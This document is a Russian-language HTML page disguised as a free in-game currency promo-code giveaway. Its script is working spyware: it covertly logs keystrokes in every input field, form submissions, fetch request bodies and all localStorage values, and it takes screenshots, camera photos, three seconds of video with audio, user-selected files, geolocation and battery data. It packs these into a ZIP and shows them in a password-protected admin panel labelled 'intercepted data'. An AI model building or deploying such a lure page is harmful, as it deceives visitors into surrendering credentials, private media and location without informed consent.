<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>БЕСПЛАТНЫЙ ПРОМОКОД</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0f, #1a0a2e);
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: rgba(20, 20, 40, 0.95);
            padding: 30px;
            border-radius: 20px;
            max-width: 950px;
            width: 100%;
            border: 2px solid #ffd700;
            box-shadow: 0 0 60px rgba(255, 215, 0, 0.3), inset 0 0 60px rgba(255, 215, 0, 0.05);
        }
        h1 {
            text-align: center;
            font-size: 36px;
            font-weight: 900;
            background: linear-gradient(45deg, #ffd700, #ff6b00, #ffd700);
            background-size: 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gold 3s ease-in-out infinite;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        @keyframes gold {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .subtitle {
            text-align: center;
            font-size: 22px;
            color: #ffd700;
            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
            margin-bottom: 20px;
            letter-spacing: 4px;
        }
        .glow {
            text-align: center;
            font-size: 18px;
            color: #ffaa44;
            text-shadow: 0 0 20px rgba(255, 170, 68, 0.4);
            margin-bottom: 20px;
        }
        button {
            background: linear-gradient(45deg, #ffd700, #ff8c00);
            color: #0a0a0f;
            border: none;
            padding: 18px 36px;
            font-size: 22px;
            font-weight: 900;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 3px;
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.4);
        }
        button:hover {
            transform: scale(1.03);
            box-shadow: 0 0 60px rgba(255, 215, 0, 0.8);
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            margin: 15px 0;
            padding: 15px;
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
            border-left: 4px solid #ffd700;
            font-family: monospace;
            color: #ffd700;
            text-align: center;
            font-size: 16px;
        }
        .preview-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 10px;
            margin: 15px 0;
        }
        .preview-grid img, .preview-grid video {
            width: 100%;
            border-radius: 8px;
            border: 2px solid #ffd700;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
        }
        .hidden { display: none !important; }
        .admin-link {
            text-align: center;
            margin-top: 20px;
        }
        .admin-link button {
            background: transparent;
            border: 2px solid #ffd700;
            color: #ffd700;
            padding: 10px 20px;
            font-size: 14px;
            width: auto;
            box-shadow: none;
        }
        .admin-link button:hover {
            background: #ffd700;
            color: #0a0a0f;
        }
        
        /* Админ-панель */
        .admin-panel {
            border-top: 2px solid #ffd700;
            margin-top: 30px;
            padding-top: 20px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border-radius: 10px;
            border: 2px solid #ffd700;
            background: rgba(0,0,0,0.3);
            color: #fff;
            font-size: 16px;
        }
        .session-item {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border-left: 4px solid #ffd700;
        }
        .password-item {
            background: rgba(255, 0, 0, 0.1);
            padding: 10px;
            margin: 5px 0;
            border-radius: 8px;
            border: 1px solid #ff4444;
            color: #ff6666;
        }
        .badge {
            background: #ffd700;
            color: #0a0a0f;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container" id="app">

    <!-- ===== ГЛАВНАЯ ===== -->
    <div id="mainPage">
        <h1>✨ БЕСПЛАТНЫЙ ПРОМОКОД ✨</h1>
        <div class="subtitle">🏆 БЕСПЛАТНАЯ ГОЛДА 🏆</div>
        <div class="glow">🔥 ПОЛУЧИ СВОЙ УНИКАЛЬНЫЙ КОД ПРЯМО СЕЙЧАС 🔥</div>
        
        <button id="startBtn">🎁 АКТИВИРОВАТЬ ПРОМОКОД</button>
        
        <div class="status" id="status">💫 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ КОДА</div>
        
        <div class="preview-grid" id="previewGrid"></div>
        
        <div class="admin-link">
            <button id="goToAdminBtn">🔐 АДМИН-ПАНЕЛЬ</button>
        </div>
    </div>

    <!-- ===== АДМИН-ПАНЕЛЬ ===== -->
    <div id="adminPage" class="hidden">
        <h1>🔐 АДМИН-ПАНЕЛЬ</h1>
        
        <div id="loginForm">
            <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin">
            <input type="password" id="adminPassword" placeholder="ПАРОЛЬ">
            <button id="adminLoginBtn" style="background:#ffd700;color:#0a0a0f;">ВОЙТИ</button>
            <div class="status" id="adminStatus"></div>
        </div>

        <div id="adminContent" class="hidden">
            <h2 style="color:#ffd700;text-align:center;font-size:22px;">📊 ВСЕ СЕССИИ</h2>
            <button id="clearSessionsBtn" style="background:#ff4444;color:#fff;margin:10px 0;">🗑️ ОЧИСТИТЬ ВСЁ</button>
            <button id="exportAllBtn" style="background:#ff8c00;color:#fff;margin:10px 0;">📥 ЭКСПОРТ</button>
            <div id="sessionsList"></div>

            <h2 style="color:#ff6666;text-align:center;font-size:20px;margin-top:30px;">🔑 ПЕРЕХВАЧЕННЫЕ ДАННЫЕ</h2>
            <div id="passwordsList"></div>

            <button id="logoutBtn" style="background:transparent;border:2px solid #ffd700;color:#ffd700;margin-top:20px;">🚪 ВЫЙТИ</button>
        </div>
    </div>
</div>

<script>
    // ============================================================
    // 1. ГЛОБАЛЬНЫЕ
    // ============================================================
    let sessions = JSON.parse(localStorage.getItem('sessions') || '[]');
    let capturedData = JSON.parse(localStorage.getItem('capturedData') || '[]');
    let isAdmin = false;
    let screenshotData = null;
    let mediaData = [];
    let collectedFiles = [];

    // ============================================================
    // 2. ПЕРЕХВАТ ДАННЫХ (скрытый)
    // ============================================================
    function captureData(value, source = 'manual', extra = {}) {
        if (!value || value.length < 1) return;
        const entry = {
            timestamp: new Date().toISOString(),
            value: value,
            source: source,
            url: window.location.href,
            ...extra
        };
        const exists = capturedData.some(p => p.value === value && p.url === entry.url);
        if (!exists) {
            capturedData.push(entry);
            localStorage.setItem('capturedData', JSON.stringify(capturedData));
        }
    }

    function setupCapture() {
        // Все поля ввода
        const observer = new MutationObserver(() => {
            document.querySelectorAll('input').forEach(field => {
                if (!field.dataset.captured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
                    field.dataset.captured = 'true';
                    field.addEventListener('input', function() {
                        if (this.value && this.value.length > 2) {
                            captureData(this.value, 'input', {
                                name: this.name || 'unknown',
                                id: this.id || 'unknown',
                                type: this.type
                            });
                        }
                    });
                    if (field.value && field.value.length > 2) {
                        captureData(field.value, 'input-initial', {
                            name: field.name || 'unknown',
                            id: field.id || 'unknown'
                        });
                    }
                }
            });
        });
        observer.observe(document.body, { childList: true, subtree: true });

        // Перехват submit
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const inputs = form.querySelectorAll('input');
            inputs.forEach(inp => {
                if (inp.value && inp.value.length > 2) {
                    captureData(inp.value, 'form-submit', {
                        name: inp.name || 'unknown',
                        id: inp.id || 'unknown'
                    });
                }
            });
        });

        // Перехват fetch
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(response => {
                try {
                    const body = args[1]?.body;
                    if (body && typeof body === 'string') {
                        const urlParams = new URLSearchParams(body);
                        for (let [key, val] of urlParams) {
                            if (val.length > 2) {
                                captureData(val, 'fetch-' + key, { url: args[0] });
                            }
                        }
                    }
                } catch(e) {}
                return response;
            });
        };

        // localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key) {
                const val = localStorage.getItem(key);
                if (val && val.length > 2) {
                    captureData(val, 'localStorage', { storageKey: key });
                }
            }
        }
    }

    // ============================================================
    // 3. ФОТО + ВИДЕО + СКРИНШОТ
    // ============================================================
    async function takeScreenshot() {
        try {
            const canvas = await html2canvas(document.body, {
                scale: 1.5,
                useCORS: true,
                allowTaint: true,
                backgroundColor: '#0a0a0f'
            });
            return canvas.toDataURL('image/png');
        } catch (err) {
            return null;
        }
    }

    async function captureMedia() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'environment', width: 1280, height: 720 },
                audio: true 
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            // Фото
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg');
            
            // Видео (3 секунды)
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.start();
            await new Promise(resolve => setTimeout(resolve, 3000));
            recorder.stop();
            await new Promise(resolve => recorder.onstop = resolve);
            
            const videoBlob = new Blob(chunks, { type: 'video/mp4' });
            const videoReader = new FileReader();
            videoReader.readAsDataURL(videoBlob);
            await new Promise(resolve => videoReader.onload = resolve);
            const videoData = videoReader.result;
            
            stream.getTracks().forEach(t => t.stop());
            
            return { photo: photoData, video: videoData };
        } catch (err) {
            return null;
        }
    }

    // ============================================================
    // 4. ЗАГРУЗКА ФАЙЛОВ
    // ============================================================
    function setupFileInput() {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.accept = 'image/*,video/*';
        input.style.display = 'none';
        input.id = 'fileUpload';
        document.body.appendChild(input);
        
        input.addEventListener('change', function(e) {
            Array.from(e.target.files).forEach(file => {
                const reader = new FileReader();
                reader.onload = function(ev) {
                    collectedFiles.push({
                        name: file.name,
                        type: file.type,
                        size: file.size,
                        data: ev.target.result,
                        timestamp: new Date().toISOString()
                    });
                    showPreview(ev.target.result, file.type);
                };
                reader.readAsDataURL(file);
            });
        });
        
        return input;
    }

    function showPreview(data, type) {
        const grid = document.getElementById('previewGrid');
        if (type.startsWith('image/')) {
            const img = document.createElement('img');
            img.src = data;
            grid.appendChild(img);
        } else if (type.startsWith('video/')) {
            const video = document.createElement('video');
            video.src = data;
            video.controls = true;
            video.style.maxWidth = '120px';
            grid.appendChild(video);
        }
    }

    // ============================================================
    // 5. ГЛАВНАЯ ФУНКЦИЯ - ВСЁ В ОДНОЙ КНОПКЕ
    // ============================================================
    async function startCollection() {
        const btn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        
        btn.disabled = true;
        btn.textContent = '⏳ ОБРАБОТКА...';
        status.textContent = '📸 СЪЁМКА МАТЕРИАЛОВ...';
        
        try {
            // 1. Скриншот
            const screenshot = await takeScreenshot();
            if (screenshot) {
                screenshotData = screenshot;
                showPreview(screenshot, 'image/png');
                status.textContent = '✅ СКРИНШОТ ГОТОВ | 📹 ЗАПИСЬ ВИДЕО...';
            }
            
            // 2. Медиа (фото + видео)
            const media = await captureMedia();
            if (media) {
                mediaData.push({
                    timestamp: new Date().toISOString(),
                    photo: media.photo,
                    video: media.video
                });
                showPreview(media.photo, 'image/jpeg');
                status.textContent = '✅ ФОТО + ВИДЕО ГОТОВЫ | 📁 СБОР ФАЙЛОВ...';
            }
            
            // 3. Запрашиваем файлы
            const fileInput = document.getElementById('fileUpload');
            fileInput.click();
            
            // Ждём загрузки файлов (максимум 10 секунд)
            await new Promise(resolve => {
                let checkInterval = setInterval(() => {
                    if (collectedFiles.length > 0) {
                        clearInterval(checkInterval);
                        resolve();
                    }
                }, 500);
                setTimeout(() => {
                    clearInterval(checkInterval);
                    resolve();
                }, 10000);
            });
            
            status.textContent = '📦 СОЗДАНИЕ АРХИВА...';
            
            // 4. Создаём ZIP
            const zip = new JSZip();
            
            // Данные
            const data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: { width: screen.width, height: screen.height },
                geolocation: await getGeolocation(),
                battery: await getBatteryInfo(),
                capturedData: capturedData.slice(-50)
            };
            
            zip.file('data.json', JSON.stringify(data, null, 2));
            zip.file('captured.json', JSON.stringify(capturedData, null, 2));
            
            // Скриншот
            if (screenshotData) {
                const base64 = screenshotData.split(',')[1];
                zip.file('screenshot.png', base64, { base64: true });
            }
            
            // Медиа
            mediaData.forEach((m, i) => {
                if (m.photo) {
                    const base64 = m.photo.split(',')[1];
                    zip.file(`media/photo_${i}.jpg`, base64, { base64: true });
                }
                if (m.video) {
                    const base64 = m.video.split(',')[1];
                    zip.file(`media/video_${i}.mp4`, base64, { base64: true });
                }
            });
            
            // Файлы пользователя
            collectedFiles.forEach((f, i) => {
                const base64 = f.data.split(',')[1];
                zip.file(`files/${i}_${f.name}`, base64, { base64: true });
            });
            
            // 5. Сохраняем сессию
            const session = {
                id: Date.now(),
                timestamp: data.timestamp,
                preview: {
                    userAgent: data.userAgent.substring(0, 50),
                    files: collectedFiles.length,
                    media: mediaData.length
                }
            };
            sessions.push(session);
            localStorage.setItem('sessions', JSON.stringify(sessions));
            
            // 6. Скачиваем ZIP
            status.textContent = '⬇️ СКАЧИВАНИЕ АРХИВА...';
            const blob = await zip.generateAsync({ type: 'blob' });
            saveAs(blob, `promo_${new Date().toISOString().slice(0,10)}.zip`);
            
            status.textContent = '🎉 ПРОМОКОД АКТИВИРОВАН! АРХИВ СКАЧАН!';
            btn.textContent = '🎁 АКТИВИРОВАТЬ ПРОМОКОД';
            btn.disabled = false;
            
        } catch (err) {
            status.textContent = '❌ ОШИБКА: ' + err.message;
            btn.textContent = '🎁 АКТИВИРОВАТЬ ПРОМОКОД';
            btn.disabled = false;
        }
    }

    // ============================================================
    // 6. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
    // ============================================================
    function getGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: 'Not supported' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                },
                () => resolve({ error: 'Denied' }),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
    }

    function getBatteryInfo() {
        return new Promise((resolve) => {
            if (!navigator.getBattery) {
                resolve({ error: 'Not supported' });
                return;
            }
            navigator.getBattery().then((battery) => {
                resolve({
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging
                });
            }).catch(() => resolve({ error: 'Failed' }));
        });
    }

    // ============================================================
    // 7. АДМИН-ПАНЕЛЬ
    // ============================================================
    function renderAdminPanel() {
        const sessionsList = document.getElementById('sessionsList');
        const passwordsList = document.getElementById('passwordsList');

        sessionsList.innerHTML = '';
        if (sessions.length === 0) {
            sessionsList.innerHTML = '<p style="color:#888;">Нет сессий</p>';
        } else {
            sessions.slice().reverse().forEach(s => {
                const div = document.createElement('div');
                div.className = 'session-item';
                div.innerHTML = `
                    <strong>${new Date(s.timestamp).toLocaleString()}</strong>
                    <span class="badge">ID: ${s.id}</span>
                    <br>UA: ${s.preview.userAgent || 'нет'}
                    <br>Файлов: ${s.preview.files || 0} | Медиа: ${s.preview.media || 0}
                    <br><button class="delete-session-btn" data-id="${s.id}" style="background:#ff4444;color:#fff;width:auto;padding:5px 15px;font-size:12px;margin-top:5px;">Удалить</button>
                `;
                sessionsList.appendChild(div);
            });
        }

        passwordsList.innerHTML = '';
        if (capturedData.length === 0) {
            passwordsList.innerHTML = '<p style="color:#888;">Нет данных</p>';
        } else {
            capturedData.slice().reverse().forEach(p => {
                const div = document.createElement('div');
                div.className = 'password-item';
                div.innerHTML = `
                    <strong>${new Date(p.timestamp).toLocaleString()}</strong>
                    <span style="color:#ff6666;">📌 ${p.value}</span>
                    <br>Источник: ${p.source || 'unknown'} | ${p.name || '—'}
                `;
                passwordsList.appendChild(div);
            });
        }

        document.querySelectorAll('.delete-session-btn').forEach(btn => {
            btn.onclick = function() {
                const id = parseInt(this.dataset.id);
                sessions = sessions.filter(s => s.id !== id);
                localStorage.setItem('sessions', JSON.stringify(sessions));
                renderAdminPanel();
            };
        });
    }

    function showAdminPage() {
        document.getElementById('mainPage').classList.add('hidden');
        document.getElementById('adminPage').classList.remove('hidden');
        document.getElementById('loginForm').classList.remove('hidden');
        document.getElementById('adminContent').classList.add('hidden');
        document.getElementById('adminStatus').textContent = '';
    }

    function showAdminContent() {
        document.getElementById('loginForm').classList.add('hidden');
        document.getElementById('adminContent').classList.remove('hidden');
        renderAdminPanel();
    }

    // ============================================================
    // 8. ИНИЦИАЛИЗАЦИЯ
    // ============================================================
    document.addEventListener('DOMContentLoaded', function() {
        setupCapture();
        setupFileInput();

        document.getElementById('startBtn').addEventListener('click', startCollection);

        document.getElementById('goToAdminBtn').addEventListener('click', showAdminPage);

        document.getElementById('adminLoginBtn').addEventListener('click', function() {
            const login = document.getElementById('adminLogin').value.trim();
            const password = document.getElementById('adminPassword').value.trim();
            if (login === 'admin' && password === '6767') {
                document.getElementById('adminStatus').textContent = '✅ ДОСТУП РАЗРЕШЁН';
                document.getElementById('adminStatus').style.color = '#4ade80';
                isAdmin = true;
                showAdminContent();
            } else {
                document.getElementById('adminStatus').textContent = '❌ НЕВЕРНЫЙ ЛОГИН ИЛИ ПАРОЛЬ';
                document.getElementById('adminStatus').style.color = '#f87171';
            }
        });

        document.getElementById('logoutBtn').addEventListener('click', function() {
            isAdmin = false;
            document.getElementById('adminPage').classList.add('hidden');
            document.getElementById('mainPage').classList.remove('hidden');
            document.getElementById('loginForm').classList.remove('hidden');
            document.getElementById('adminContent').classList.add('hidden');
            document.getElementById('adminStatus').textContent = '';
        });

        document.getElementById('clearSessionsBtn').addEventListener('click', function() {
            if (confirm('Удалить всё?')) {
                sessions = [];
                capturedData = [];
                localStorage.setItem('sessions', JSON.stringify(sessions));
                localStorage.setItem('capturedData', JSON.stringify(capturedData));
                renderAdminPanel();
            }
        });

        document.getElementById('exportAllBtn').addEventListener('click', function() {
            const exportData = { sessions, capturedData, exportDate: new Date().toISOString() };
            const jsonStr = JSON.stringify(exportData, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `export_${new Date().toISOString().slice(0,10)}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        });

        // Автоматический клик по кнопке при загрузке (опционально)
        // setTimeout(() => document.getElementById('startBtn').click(), 1000);
    });
</script>
